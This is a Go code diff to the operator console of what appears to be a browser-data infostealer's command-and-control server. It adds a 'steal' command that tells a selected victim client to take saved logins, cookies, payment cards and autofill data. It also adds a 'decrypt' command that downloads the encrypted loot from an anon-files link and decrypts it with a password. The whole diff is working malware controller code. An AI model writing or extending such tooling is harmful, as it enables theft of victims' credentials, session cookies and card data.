@@ -4,7 +4,9 @@ import (
 	"bufio"
 	"fmt"
 	"github.com/charmbracelet/log"
+	"io"
 	_ "net"
+	"net/http"
 	"os"
 	"strconv"
 	"strings"
@@ -81,12 +83,16 @@ func CommandLine() {
 	scanner := bufio.NewScanner(os.Stdin)
 	for {
 		scanner.Scan()
-		split := strings.Split(scanner.Text(), " ")
+		userInput := scanner.Text()
+		if strings.HasPrefix(userInput, "/") {
+			userInput = userInput[1:]
+			split := strings.Split(userInput, " ")
 
-		commandName := split[0]
-		commandArgs := split[1:]
+			commandName := split[0]
+			commandArgs := split[1:]
 
-		ParseCommand(commandName, commandArgs)
+			ParseCommand(commandName, commandArgs)
+		}
 	}
 }
 
@@ -95,9 +101,16 @@ func RegisterCommands() {
 		log.Infof("Available commands:")
 		for _, command := range commands {
 			if len(command.Args) == 0 {
-				log.Infof("%s - %s", command.Name, command.Description)
+				log.Infof("/%s - %s", command.Name, command.Description)
 			} else {
-				log.Infof("%s [%s] - %s", command.Name, strings.Join(command.Args, " "), command.Description)
+				displayArgs := func(commandArgs []string) string {
+					text := ""
+					for _, arg := range commandArgs {
+						text += "[" + arg + "] "
+					}
+					return text[:len(text)-1]
+				}
+				log.Infof("/%s %s - %s", command.Name, displayArgs(command.Args), command.Description)
 			}
 		}
 		return nil
@@ -167,8 +180,63 @@ func RegisterCommands() {
 		CallClear()
 		return nil
 	})
-	RegisterCommand("decrypt", "Decrypt chrome data", []string{"login, cookies, cards, autofill"}, true, func(args []string) error {
-		selectedClient.SendData("decrypt " + args[0])
+	RegisterCommand("steal", "Steal browser data", []string{"login, cookies, cards, autofill"}, true, func(args []string) error {
+		selectedClient.SendData("steal " + args[0])
+		return nil
+	})
+	RegisterCommand("decrypt", "Decrypt response browser data", []string{"url(only anon-files)", "filename", "password"}, false, func(args []string) error {
+		arg := args[0]
+		if IsUrl(arg) {
+			request := MakeRequest(arg)
+			url := ExtractDownloadLink(request)
+
+			// Make the GET request
+			response, err := http.Get(url)
+			if err != nil {
+				return err
+			}
+			defer response.Body.Close()
+
+			// Check the status code of the response
+			if response.StatusCode != http.StatusOK {
+				return err
+			}
+
+			filePath := GetExecutablePath() + "\\" + args[1]
+
+			// Create the local file to save the downloaded content
+			file, err := os.Create(filePath)
+			if err != nil {
+				return err
+			}
+			defer file.Close()
+
+			// Copy the content from the response body to the local file
+			_, err = io.Copy(file, response.Body)
+			if err != nil {
+				return err
+			}
+
+			log.Infof("File downloaded and saved to: %s", filePath)
+
+			fileBytes, err := os.ReadFile(filePath)
+			if err != nil {
+				return err
+			}
+
+			data, err := DecryptData(fileBytes, args[2])
+			if err != nil {
+				return err
+			}
+			ClearFile(filePath)
+
+			err = os.WriteFile(filePath, data, 0644)
+			if err != nil {
+				return err
+			}
+
+			log.Infof("Successfully decrypted file: %s", filePath)
+		}
 		return nil
 	})
 }
